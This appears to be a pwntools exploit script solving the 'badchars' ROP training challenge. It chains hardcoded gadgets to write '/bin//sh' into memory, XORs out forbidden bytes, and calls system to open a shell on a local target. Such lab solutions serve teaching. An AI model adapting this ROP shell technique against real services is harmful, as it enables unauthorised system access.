#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
import struct
context.log_level = 'info'

IP = ['127.0.0.1']
PORT = 9091
FILENAME = "./badchars"
if PORT:
    tube = remote(IP[0], PORT)
else:
    tube = process(FILENAME)

binary = ELF(FILENAME)

badchars = "bic/ fns"
replace_char = '\xeb'
cmd = "/bin//sh"

write_dest = binary.get_section_by_name(".data").header.sh_addr + 7
# heh< i cheated and used an offset that wouldn't give me badchars in my shellcode
# thne you just xor to win
# hax
payload = cyclic(8 * 5)
payload += p64(0x00400b3b) # pop r12, r13
payload += cmd
payload += p64(write_dest)
payload += p64(0x00400b34) # mov [r13], r12
#payload += p64(0x00400bb0) # pop r14, pop r15
for i,c in enumerate(cmd):
    if c in badchars:
        payload += p64(0x00400bb0) # pop r14, pop r15
        payload += p64(ord(xor(c,replace_char)))
        payload += p64(write_dest + i)
        payload += p64(0x00400b30) # xor [r15], r14b
payload += p64(0x00400bb3)
payload += p64(write_dest)
payload += p64(binary.symbols['plt.system'])

#gdb.attach(tube)
tube.recvuntil("> ")
log.info("sending %s" % payload)
log.info("payload length: %d" % len(payload))
tube.sendline(payload)
tube.interactive()

